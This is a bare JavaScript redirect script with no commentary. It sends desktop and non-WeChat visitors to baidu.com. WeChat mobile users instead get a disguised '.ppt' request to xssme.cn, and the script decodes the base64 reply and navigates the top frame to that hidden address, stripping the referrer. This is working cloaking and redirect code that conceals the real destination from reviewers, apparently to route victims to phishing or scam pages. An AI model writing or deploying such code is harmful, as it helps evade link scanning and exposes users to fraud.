var id=24; var url='https://xssme.cn';
function GetQueryString(name) {
    var reg = new RegExp("(^|&)" + name + "=([^&]*)(&|$)");
    var r = window.location.search.substr(1).match(reg);
    if (r != null) return unescape(r[2]);
    return null;
}

function isWx() {
    var platform = navigator.platform;
    var win = platform.indexOf('Win') === 0;
    var mac = platform.indexOf('Mac') === 0;
    var ua = /micromessenger/.test(navigator.userAgent.toLowerCase())
    if (ua && !win && !mac) {
        return true;
    } else {
        return false;
    }
}

function checkVersion() {
    var userAgent = navigator.userAgent.toLowerCase();
    var key = /micromessenger/;
    let res = false;
    if (key.test(userAgent)) {
        var index = userAgent.search(key);
        let version = '';
        for (var i = index + 15; i < userAgent.length; i++) {
            var item = userAgent[i];
            if (/^\d{1,}$/.test(item) || item === '.') {
                version += item;
            } else {
                break;
            }
        }
        version = parseFloat(version);
        if (version >= 7.0){
            res = true;
        }
    }
    return res;
}

function openLink(url) {
    if(window !== top) {
        top.location = url;
        return;
    }
    var label = document.createElement('a');
    label.setAttribute('rel', 'noreferrer');
    label.setAttribute('href', url);
    try {
        document.body.appendChild(label);
    } catch (e) {
        location = url;
    }
    label.click();
}

function init() {
    var queryUrl = url;
    var rmd = Math.random().toString(36).substr(2);
    var entranceUrl = `${queryUrl}/XT-${id}-${rmd}.ppt?t=${Date.now()}`;
    fetch(entranceUrl).then(response => response.text()).then(res => openLink(atob(res)));
}

if (!isWx() || !checkVersion()) {
    openLink('http://www.baidu.com');
} else {
    init();
}